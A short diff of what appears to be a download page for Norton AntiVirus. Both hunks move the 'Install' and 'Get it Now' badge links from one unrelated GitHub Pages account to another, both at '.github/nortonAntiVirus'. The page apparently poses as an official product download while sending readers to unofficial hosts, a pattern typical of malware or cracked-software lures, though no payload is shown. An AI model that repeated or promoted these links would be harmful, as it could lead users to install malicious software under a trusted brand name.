@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://andrey-petrov-software.github.io/.github/nortonAntiVirus)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://poke-pokemon.github.io/.github/nortonAntiVirus)
 
 </div>
 
@@ -81,7 +81,7 @@ Norton's value proposition as a comprehensive security suite is the integration 
 
 <p align="center">
 
-[![Get it Now Norton AntiVirus](https://img.shields.io/badge/Get_it_Now-3A86FF?style=for-the-badge&logo=apple&logoColor=white)](https://andrey-petrov-software.github.io/.github/nortonAntiVirus)
+[![Get it Now Norton AntiVirus](https://img.shields.io/badge/Get_it_Now-3A86FF?style=for-the-badge&logo=apple&logoColor=white)](https://poke-pokemon.github.io/.github/nortonAntiVirus)
 
 </p>
 
